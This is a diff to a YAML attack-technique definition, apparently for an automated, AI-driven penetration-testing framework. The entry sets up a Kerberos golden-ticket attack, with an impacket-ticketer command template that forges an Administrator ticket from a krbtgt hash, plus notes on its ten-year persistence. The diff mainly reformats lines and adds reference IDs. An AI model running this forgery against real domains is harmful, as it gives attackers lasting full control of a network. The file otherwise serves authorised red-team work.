@@ -5,8 +5,7 @@ preconditions:
 - domain_joined
 parameters:
   target_ip: from_engagement.target_ip
-command_template: impacket-ticketer -nthash '{krbtgt_hash}' -domain-sid '{sid}' -domain
-  {domain} Administrator
+command_template: impacket-ticketer -nthash '{krbtgt_hash}' -domain-sid '{sid}' -domain {domain} Administrator
 parser: impacket_parser
 expected_effects:
 - golden_ticket_forged
@@ -15,6 +14,30 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: 'Golden ticket: forged TGT using krbtgt hash. Full domain access for 10
-  years (default). Survives password changes except krbtgt reset (twice).'
+mechanism: 'Golden ticket: forged TGT using krbtgt hash. Full domain access for 10 years (default). Survives password changes
+  except krbtgt reset (twice).'
 hacktricks_ref: windows-hardening/stealing-credentials/credentials-mimikatz.md
+references:
+  ocd_mindmap_node_ids:
+  - 00d95fb22f
+  - 0fbac96ac1
+  - 155b42d9cd
+  - 337bc19c57
+  - 47b34a2482
+  - 4c8a1de7c1
+  - 609a98cdf8
+  - 73548655eb
+  - 79afa96e1d
+  - 8f7e2cdb5f
+  - 96696bc47f
+  - b1e65277aa
+  - b2d42093e6
+  - c21b7a4047
+  - cc03abded4
+  - cc231d6118
+  - d9683fa976
+  - e59ff07eb1
+  - f0b67db65c
+  - f41470d83a
+  - f45806da29
+  - fe998000ba
